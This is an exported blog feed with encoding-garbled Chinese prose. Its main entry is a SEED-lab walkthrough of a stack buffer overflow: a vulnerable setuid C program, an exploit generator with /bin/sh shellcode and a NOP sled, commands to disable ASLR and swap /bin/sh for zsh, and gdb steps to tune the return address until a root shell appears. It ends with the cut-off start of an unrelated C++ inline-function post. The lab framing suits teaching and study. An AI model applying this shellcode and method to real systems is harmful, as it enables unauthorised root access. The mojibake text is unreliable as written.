    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨ç ”ç©¶<code>stack overflow</code>çš„å¤ç°ï¼Œå‘ç°ç½‘ä¸Šè®¸å¤šæ•™ç¨‹éƒ½åè€äº†ï¼Œä¸”è®¸å¤šå…³é”®æ­¥éª¤æ²¡æœ‰è¯´æ˜æ¸…æ¥šï¼Œå¯¼è‡´å°ç™½åœ¨ä¸€æ­¥æ­¥æ“ä½œçš„æ—¶å€™ç»å¸¸å‡ºç°æ— æ³•æ­£ç¡®è·å–<code>shellcode</code>çš„æƒ…å†µï¼Œæœ¬äººä¹Ÿæ˜¯å†ç»è¯¸å¤š<strong>å¤§å‘</strong>ï¼Œæ€»ç®—æ˜¯æˆåŠŸå¤ç°äº†è¿™ä¸€è¿‡ç¨‹ã€‚ä¸‹é¢æ˜¯æº¢å‡ºæˆåŠŸåçš„æ•ˆæœå›¾ã€‚<br><img src="https://img-blog.csdnimg.cn/20200929162546732.png#pic_center" alt=""></p><blockquote><p>ä¸ªä¸­ä¼šæ¶‰åŠåˆ°å‚æ•°åœ¨å‡½æ•°æ ˆä¸­çš„å­˜å‚¨ï¼Œæ ˆçš„è¿”å›åœ°å€ï¼Œå¸§æŒ‡é’ˆï¼Œå‡½æ•°å¦‚ä½•æ‰§è¡Œçš„è¿‡ç¨‹ï¼Œè¿™éƒ¨åˆ†ä¸å†èµ˜è¿°ï¼Œè‡ªè¡ŒæŸ¥é˜…ç›¸å…³èµ„æ–™ã€‚</p></blockquote><h1 id="æ”»å‡»å‡†å¤‡"><a href="#æ”»å‡»å‡†å¤‡" class="headerlink" title="æ”»å‡»å‡†å¤‡"></a>æ”»å‡»å‡†å¤‡</h1><p><strong>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨</strong>ï¼Œç”±äº<code>stack overflow</code>å·²ç»æ˜¯ä¸Šå¤æ—¶ä»£çš„æ¼æ´ï¼Œåœ¨ç°è¡Œçš„è®¸å¤šæ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆä¸­å·²ç»åšåˆ°äº†å¾ˆå¥½çš„ä¿æŠ¤æœºåˆ¶ï¼Œå¦‚æœä»¥è¿™äº›ç³»ç»Ÿä½œä¸ºæ”»å‡»å…¥å£ï¼Œå°ç™½æ— å¼‚ä»¥åµå‡»çŸ³ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶ä¸€ä¸‹æ‰€ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œè¿™é‡Œç»™å‡ºæˆ‘ä½¿ç”¨çš„ç¯å¢ƒï¼š</p><ul><li><strong>OS</strong>: ubuntu12.04ï¼Œé‡‡ç”¨äº†<code>SEED LAB</code>å®éªŒå®¤æä¾›çš„ç¯å¢ƒï¼Œ<a href="https://seedsecuritylabs.org/lab_env.html">ç‚¹å‡»è¿™é‡ŒæŸ¥çœ‹</a></li><li><strong>è™šæ‹Ÿæœºè½¯ä»¶</strong>ï¼šVmware workstation 16</li></ul><h1 id="æ”»å‡»ç›®æ ‡ä¸åŸç†"><a href="#æ”»å‡»ç›®æ ‡ä¸åŸç†" class="headerlink" title="æ”»å‡»ç›®æ ‡ä¸åŸç†"></a>æ”»å‡»ç›®æ ‡ä¸åŸç†</h1><ul><li>æ”»å‡»ç›®æ ‡æ˜¯è·å–åˆ°æ“ä½œç³»ç»Ÿçš„<code>root</code>æƒé™</li><li>æ”»å‡»åŸç†æ˜¯ç›®æ ‡ç¨‹åºå­˜åœ¨çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œæ„é€ ç‰¹å®šçš„è¾“å…¥å†…å®¹è¦†ç›–åŸå§‹çš„è¿”å›åœ°å€ï¼Œä»¥æ‰§è¡Œç›¸åº”çš„<code>shellcode</code>ã€‚</li></ul><h2 id="æ¼æ´ç¨‹åº"><a href="#æ¼æ´ç¨‹åº" class="headerlink" title="æ¼æ´ç¨‹åº"></a>æ¼æ´ç¨‹åº</h2><p>ä¸‹é¢æ˜¯æ¼æ´ç¨‹åº(<code>stack.c</code>)çš„ä»£ç ï¼Œå®ƒæ‰€åšçš„ä¸»è¦å·¥ä½œæ˜¯è¯»å–åŒç›®å½•ä¸‹<code>badfile</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶å¤åˆ¶åˆ°å‡½æ•°çš„ä¸´æ—¶æ•°ç»„å˜é‡<code>buffer[]</code>ä¸­ï¼Œä½†è¾“å…¥çš„å†…å®¹å¤§äº<code>buffer</code>çš„å®¹é‡æ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´æ•°æ®è¦†ç›–å‡½æ•°æ ˆä¸­çš„è¿”å›åœ°å€ï¼Œè€Œæ”»å‡»è€…é€šè¿‡ç²¾å¿ƒè®¡ç®—åŸè¿”å›åœ°å€çš„ä½ç½®ï¼Œå°†å…¶æ›¿æ¢æˆ<code>shellcode</code>çš„åœ°å€ï¼Œä»è€Œå¯¼è‡´<code>shellcode</code>æ‰§è¡Œï¼Œè·å¾—<code>root</code>æƒé™ã€‚</p><blockquote><p>è·å–<code>root</code>æƒé™çš„å‰ææ˜¯æ¼æ´ç¨‹åºé€šè¿‡<code>root</code>æƒé™ç¼–è¯‘ï¼Œèµ‹äºˆç›¸åº”<code>root</code>æƒé™</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* stack.c */</span><span class="token comment">/* This program has a buffer overflow vulnerability. */</span><span class="token comment">/* Our task is to exploit this vulnerability */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//å’ŒåŸç¨‹åºä¸ä¸€æ ·çš„åœ°æ–¹åœ¨æ­¤å¤„,å¦‚æœæ²¡æœ‰ä¿®æ”¹,æœ€ç»ˆç»“æœä¼šæ˜¯return properly æ— æ³•æ”»å‡»æˆåŠŸ.è·å¾—rootæƒé™</span><span class="token comment">/* The following statement has a buffer overflow problem */</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="æ”»å‡»ç¨‹åº"><a href="#æ”»å‡»ç¨‹åº" class="headerlink" title="æ”»å‡»ç¨‹åº"></a>æ”»å‡»ç¨‹åº</h2><p>æ”»å‡»ç¨‹åº(<code>exploit.c</code>)ä¸»è¦æ˜¯ç”¨æ¥ç”ŸæˆæŒ‡å®šçš„<code>badfile</code>ï¼Œå®ç°<code>shellcode</code>çš„æ³¨å…¥ï¼Œè®©æ¼æ´ç¨‹åºèƒ½å¤Ÿç²¾ç¡®æ‰§è¡Œã€‚å…¶ä¸­<code>shellcode</code>å°±æ˜¯è®©ç¨‹åºæ‰§è¡Œ<code>/bin/sh</code>çš„ç›¸åº”æ±‡ç¼–ä»£ç ï¼Œç¨‹åºåˆ›å»ºäº†ä¸€ä¸ª<code>buffer</code>æ•°ç»„ï¼Œç”¨äºå­˜å‚¨<code>shellcode</code>ï¼ŒåŒæ—¶åœ¨<code>shellcode</code>å‰é¢ç”¨<code>0x90</code>(NOPæŒ‡ä»¤ï¼Œä¸åšæ“ä½œæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤)å¡«å……ï¼Œè¿™ä½¿å¾—<code>shellcode</code>æœ‰å¤šä¸ªå…¥å£ç‚¹ï¼Œå¢å¤§æ‰§è¡Œæ¦‚ç‡ã€‚å…·ä½“å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* exploit.c */</span><span class="token comment">/* A program that creates a file containing code for launching shell*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\x31\xc0"</span>    <span class="token comment">//xorl %eax,%eax</span><span class="token string">"\x50"</span>        <span class="token comment">//pushl %eax</span><span class="token string">"\x68"</span><span class="token string">"//sh"</span>  <span class="token comment">//pushl $0x68732f2f</span><span class="token string">"\x68"</span><span class="token string">"/bin"</span>  <span class="token comment">//pushl $0x6e69622f</span><span class="token string">"\x89\xe3"</span>    <span class="token comment">//movl %esp,%ebx</span><span class="token string">"\x50"</span>        <span class="token comment">//pushl %eax</span><span class="token string">"\x53"</span>        <span class="token comment">//pushl %ebx</span><span class="token string">"\x89\xe1"</span>    <span class="token comment">//movl %esp,%ecx</span><span class="token string">"\x99"</span>        <span class="token comment">//cdq</span><span class="token string">"\xb0\x0b"</span>    <span class="token comment">//movb $0x0b,%al</span><span class="token string">"\xcd\x80"</span>    <span class="token comment">//int $0x80</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span><span class="token comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* You need to fill the buffer with appropriate contents here */</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">"\x??\x??\x??\x??"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è¿™é‡Œä»24å¡«å†™ï¼Œä½†æ˜¯ä¸Šé¢æ¼æ´ç¨‹åºbufferåªæœ‰12ï¼Œæˆ‘ä¹Ÿæ²¡ææ‡‚</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span><span class="token number">100</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Save the contents to the file "badfile" */</span>badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./badfile"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><h1 id="æ”»å‡»æ­¥éª¤"><a href="#æ”»å‡»æ­¥éª¤" class="headerlink" title="æ”»å‡»æ­¥éª¤"></a>æ”»å‡»æ­¥éª¤</h1><p>æ€»ä½“çš„æ”»å‡»æ­¥éª¤åŒ…æ‹¬ï¼š</p><ol><li>å…³é—­ç°æœ‰å®‰å…¨æœºåˆ¶ å…³é—­ASLRï¼ˆå†…å­˜åœ°å€éšæœºåŒ–ï¼‰ï¼Œç”¨<code>zsh</code>æ›¿æ¢<code>sh</code></li><li>ä»¥<code>root</code>èº«ä»½ç¼–è¯‘<code>stack.c</code>ï¼ˆæ¼æ´ç¨‹åºï¼‰</li><li>ç¡®å®š<code>shellcode</code>åœ¨å†…å­˜ä¸­çš„åœ°å€</li><li>æ‰§è¡Œæ”»å‡»ç¨‹åºï¼Œæ¼æ´ç¨‹åºï¼ŒæŸ¥çœ‹æ”»å‡»æ•ˆæœ</li></ol><h2 id="å…³é—­ç°æœ‰å®‰å…¨æœºåˆ¶"><a href="#å…³é—­ç°æœ‰å®‰å…¨æœºåˆ¶" class="headerlink" title="å…³é—­ç°æœ‰å®‰å…¨æœºåˆ¶"></a>å…³é—­ç°æœ‰å®‰å…¨æœºåˆ¶</h2><ul><li>å…³é—­ASLR<br><code>linux</code>ç³»ç»Ÿä¸ºäº†é˜²æ­¢<code>stack overflow</code>ï¼Œé»˜è®¤é‡‡ç”¨äº†<code>ASLR</code>(å†…å­˜åœ°å€éšæœºåŒ–)ï¼Œè¿™å¯¼è‡´æˆ‘ä»¬æ— æ³•ç¡®å®š<code>shellcode</code>åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œä¸ºäº†ç®€ä¾¿éœ€è¦å…³é—­  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text"># å…³é—­æ–¹å¼1sudo sysctl -w kernel.randomize_va_space&#x3D;0# å…³é—­æ–¹å¼2sudo  -secho 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li><li>ç”¨<code>zsh</code>æ›¿æ¢<code>sh</code><br>  åœ¨<code>ubuntu12.04,ubuntu16.04</code>ä¸­ï¼Œ<code>/bin/sh</code>å®é™…ä¸ŠæŒ‡å‘ä¸€ä¸ª<code>/bin/dash</code>çš„é“¾æ¥æ–‡ä»¶ï¼Œå½“å…¶å‘ç°è‡ªå·±åœ¨ä¸€ä¸ªç‰¹æƒç¨‹åºä¸­è¿è¡Œæ—¶ï¼Œä¼šå°†æœ‰æ•ˆç”¨æˆ·IDæ”¹æˆå®é™…ç”¨æˆ·IDï¼Œè®©æˆ‘ä»¬æ— æ³•è·å¾—<code>root</code>æƒé™ã€‚æ›¿æ¢æ–¹å¼å¦‚ä¸‹ï¼š  <div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo sucd &#x2F;bincp sh sh.bak  # å¤‡ä»½rm shln -s zsh sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>è¿˜æœ‰ä¸€ç§æ›¿ä»£è§£å†³æ–¹æ¡ˆæ˜¯æ›´æ”¹<code>shellcode</code>ä¸­<code>&quot;\x68&quot;&quot;//sh&quot;</code>ä¸º<code>&quot;\x68&quot;&quot;/zsh&quot;</code></p></blockquote></li></ul><h2 id="ä»¥rootèº«ä»½ç¼–è¯‘æ¼æ´ç¨‹åº"><a href="#ä»¥rootèº«ä»½ç¼–è¯‘æ¼æ´ç¨‹åº" class="headerlink" title="ä»¥rootèº«ä»½ç¼–è¯‘æ¼æ´ç¨‹åº"></a>ä»¥rootèº«ä»½ç¼–è¯‘æ¼æ´ç¨‹åº</h2><p>ç¡®ä¿ç¨‹åºæœ‰<code>root</code>æƒé™<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo gcc -g -z execstack -fno-stack-protector -o stack stack.csudo chmod u+s stack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><h2 id="ç¡®å®šshellcodeåœ¨å†…å­˜ä¸­ä½ç½®"><a href="#ç¡®å®šshellcodeåœ¨å†…å­˜ä¸­ä½ç½®" class="headerlink" title="ç¡®å®šshellcodeåœ¨å†…å­˜ä¸­ä½ç½®"></a>ç¡®å®š<code>shellcode</code>åœ¨å†…å­˜ä¸­ä½ç½®</h2><p>æ³¨æ„<code>shellcode</code>æœ¬è´¨æ˜¯è¢«æ”¾åœ¨<code>badfile</code>æ–‡ä»¶ä¸­ï¼Œè€Œæ¼æ´ç¨‹åºè¯»å–<code>badfile</code>å¤åˆ¶åˆ°<code>buffer</code>æ•°ç»„ä¸­ï¼Œé‚£ä¹ˆ<code>badfile</code>çš„èµ·å§‹ä½ç½®å°±æ˜¯<code>stack.c</code>ä¸­<code>buffer</code>çš„èµ·å§‹ä½ç½®ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è®©<code>shellcode</code>çš„åœ°å€åˆšå¥½è¢«å†™åœ¨æ¼æ´ç¨‹åºå‡½æ•°<code>bof</code>è¿”å›åœ°å€çš„ä½ç½®ã€‚å…·ä½“å¦‚ä¸‹å›¾ï¼š<br><img src="https://img-blog.csdnimg.cn/20200929171137106.png#pic_center" style="zoom:50%;" /><br>ç”¨<code>gdk</code>è°ƒè¯•<code>stack</code>ï¼Œåæ±‡ç¼–<code>main</code>å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">gdb stackdisass main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200929171437517.png#pic_center" alt=""><br>æ³¨æ„çº¢æ¡†å¤„çš„æ“ä½œï¼Œè¿™æ˜¯mainå‡½æ•°æ‰§è¡Œåæ ˆç»™å±€éƒ¨å˜é‡ç•™å‡ºçš„ç©ºé—´ï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹<code>str</code>çš„åœ°å€ï¼Œ<code>shellcode</code>åº”è¯¥å·²ç»è¢«æ”¾ç½®åœ¨<code>str</code>æ•°ç»„ä¸­ï¼Œè·ç¦»100çš„ä½ç½®ã€‚<br>éšæ„æ‰¾ä¸ªåœ°æ–¹è®¾ç½®æ–­ç‚¹ï¼Œå¹¶è¿è¡Œï¼Œæ¥ç€æŸ¥çœ‹<code>str</code>çš„åœ°å€ï¼Œå¹¶è®¡ç®—+100åçš„åœ°å€ç»“æœ</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">b *0x080484afrp &amp;strp&#x2F;x 0xbffff127+100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200930122635574.png#pic_center" alt=""></p><p>åœ¨<code>exploit.c</code>ä¸­å°†<code>\x?\x?\x?\x?</code>çš„éƒ¨åˆ†ç”¨<code>0xbffff18b</code>åœ°å€æ›¿æ¢<br><img src="https://img-blog.csdnimg.cn/20200930123010982.png#pic_center" alt=""></p><h2 id="æ‰§è¡Œæ”»å‡»ç¨‹åº"><a href="#æ‰§è¡Œæ”»å‡»ç¨‹åº" class="headerlink" title="æ‰§è¡Œæ”»å‡»ç¨‹åº"></a>æ‰§è¡Œæ”»å‡»ç¨‹åº</h2><p>å¯¹æ”»å‡»ç¨‹åºç¼–è¯‘å¹¶æ‰§è¡Œå¾—åˆ°<code>badfile</code>,å†æ‰§è¡Œ<code>./stack</code>æŸ¥çœ‹æ”»å‡»æ•ˆæœã€‚<br><img src="https://img-blog.csdnimg.cn/20200930123207297.png#pic_center" alt=""><br>å‘ç°æŒ‡ä»¤éæ³•ï¼Œè¯´æ˜æˆ‘ä»¬æ²¡æœ‰æ­£ç¡®æ‰¾åˆ°<code>shellcode</code>æŒ‡ä»¤åœ°å€ã€‚</p><blockquote><p>è¿™ä¸ªåœ°æ–¹å›°æ‰°äº†æˆ‘å¾ˆä¹…ï¼Œæ˜¯ä¸ªå¤§å‘ï¼Œåæ¥å‘ç°ä¸€ç¯‡æ–‡ç« ä¸­å†™åˆ°<code>gdbçš„è°ƒè¯•ç¯å¢ƒä¼šå½±å“bufåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œè™½ç„¶æˆ‘ä»¬å…³é—­äº†ASLRï¼Œä½†è¿™åªèƒ½ä¿è¯bufçš„åœ°å€åœ¨gdbçš„è°ƒè¯•ç¯å¢ƒä¸­ä¸å˜ï¼Œä½†å½“æˆ‘ä»¬ç›´æ¥æ‰§è¡Œ./stackçš„æ—¶å€™ï¼Œbufçš„ä½ç½®ä¼šå›ºå®šåœ¨åˆ«çš„åœ°å€ä¸Šã€‚</code>ã€‚</p></blockquote><p>å³å­˜æ”¾<code>shellcode</code>çš„åœ°å€ç›¸æ¯”åŸæ¥ä¼šæœ‰åå·®ï¼Œå› æ­¤å°è¯•åœ¨æ‰¾åˆ°çš„<code>shellcode</code>åœ°å€ä¸Šè¿›è¡Œåç§»ï¼Œè¿™é‡Œæˆ‘å°è¯•äº†è®¸å¤šç§ï¼Œå‘ç°å°†<code>8b</code>æ¢æˆ<code>ab</code>æ˜¯å¯è¡Œçš„ã€‚<br><img src="https://img-blog.csdnimg.cn/20200930123530378.png#pic_center" alt=""><br>å†åšä¸€æ¬¡æ”»å‡»å¯å‘ç°è·å–åˆ°äº†rootæƒé™<br><img src="https://img-blog.csdnimg.cn/20200930123642159.png#pic_center" alt=""></p><blockquote><p>è¯´æ˜<code>shllcode</code>å®é™…æ‰§è¡Œç›¸æ¯”äºè°ƒè¯•å†…å­˜åœ°å€ååäº†30å¤šä½ï¼Œå¯ä»¥å°è¯•å°†<code>8b</code>ä¿®æ”¹æˆæ›´åé¢æˆ–é™„è¿‘çš„æ•°å€¼ï¼Œå¦‚<code>af</code>,<code>b4</code>éƒ½æ˜¯å¯è¡Œçš„ã€‚</p></blockquote><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç¼“å†²åŒºæº¢å‡ºæ˜¯ååˆ†å¤è€å´åˆç»å…¸çš„ç¨‹åºæ¼æ´ï¼Œè®¸å¤šæ›´è¿‘ä¸€æ­¥çš„å¦‚<code>return-to-libc</code>,<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</strong>ï¼Œéƒ½æ˜¯åŸºäºæ­¤åŸºç¡€ä¸Šåšçš„è¿›ä¸€æ­¥æ·±å…¥æ”»å‡»ï¼Œå› æ­¤æŒæ¡æœ€åŸºç¡€çš„<code>stack overflow</code>è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚è¿™ä¸ªåœ°æ–¹æˆ‘å‚è€ƒäº†è®¸å¤šç½‘ä¸Šè®¸å¤šæ•™ç¨‹ï¼Œå®ƒä»¬å¤§éƒ¨åˆ†éƒ½æ˜¯è°ƒè¯•é˜¶æ®µç›´æ¥è·å–åˆ°<code>str</code>æˆ–è€…<code>esp</code>åœ°å€åé€šè¿‡è®¡ç®—ç›¸å¯¹ä½ç½®å¾—åˆ°<code>shellcode</code>åœ°å€ï¼Œä½†æ ¹æ®æˆ‘çš„å®é™…æ“ä½œç»“æœæ¥çœ‹æœ‰è¾ƒå¤§å‡ºå…¥ï¼Œå®è·µæ‰æ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†ã€‚å‚è€ƒèµ„æ–™é‡Œåˆ—ä¸¾çš„éƒ½æ˜¯ä¸æ­¤å®éªŒç›¸å…³çš„èµ„æ–™ï¼Œä¾›è¯»è€…å¯¹æ¯”å‚è€ƒã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://blog.csdn.net/zengxyuyu/article/details/53150521">SEEDå®éªŒ:ç¼“å†²åŒºæº¢å‡ºæ¼æ´å®éªŒ__ç½‘ç»œæ”»é˜²å®éªŒ</a></li><li><a href="https://www.freebuf.com/vuls/221081.html">SEEDï¼šç¼“å†²åŒºæº¢å‡ºæ¼æ´å®éªŒ</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€C++ã€‘10åˆ†é’Ÿææ‡‚å†…è”å‡½æ•°</title>
    <link href="/article/64960.html"/>
    <url>/article/64960.html</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><strong>å†…è”å‡½æ•°</strong>æ˜¯<code>C++</code>ç‰¹æœ‰çš„ä¸€ç§å‡½æ•°ï¼Œé€šè¿‡æ·»åŠ å…³é”®å­—<code>inline</code>åˆ°å‡½æ•°å®šä¹‰å‰ï¼Œå®ç°å°†æ™®é€šå‡½æ•°è½¬æ¢ä¸ºå†…è”å‡½æ•°ã€‚æœ¬æ–‡æ—¨åœ¨ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢é€šä¿—åœ°è®²è§£å†…è”å‡½æ•°ï¼Œå¸®åŠ©å°ç™½è½»æ¾ç†è§£å’Œä½¿ç”¨å†…è”å‡½æ•°ã€‚</p><ol><li>å†…è”å‡½æ•°æ˜¯å•¥</li><li>å†…è”å‡½æ•°æœ‰å•¥ç”¨</li><li>å•¥æƒ…å†µä¸‹ä½¿ç”¨å†…è”å‡½æ•°  </li></ol><h1 id="å†…è”å‡½æ•°æ˜¯å•¥"><a href="#å†…è”å‡½æ•°æ˜¯å•¥" class="headerlink" title="å†…è”å‡½æ•°æ˜¯å•¥"></a>å†…è”å‡½æ•°æ˜¯å•¥</h1><p>ç›´æ¥å…ˆä¸Šå®šä¹‰ï¼š</p><ul><li>å®šä¹‰ï¼šä»¥<code>inline</code>å…³é”®å­—ä¿®é¥°å®šä¹‰çš„ä¸€ç±»å‡½æ•°ï¼Œè®©ç¼–è¯‘å™¨ç”¨å‡½æ•°ä»£ç æ›¿æ¢å‡½æ•°è°ƒç”¨  </li></ul><p>å¬ç€æœ‰ç‚¹ç„ä¹ï¼Œçœ‹ä¸‹é¢ä¸€ä¸ªå®ä¾‹ï¼š</p><ul><li>å®ä¾‹ï¼š    <div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> a <span class="token operator">></span> b <span class="token operator">?</span> a<span class="token operator">:</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">// &lt;=> cout&lt;&lt;a > b ? a:b&lt;&lt;endl;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 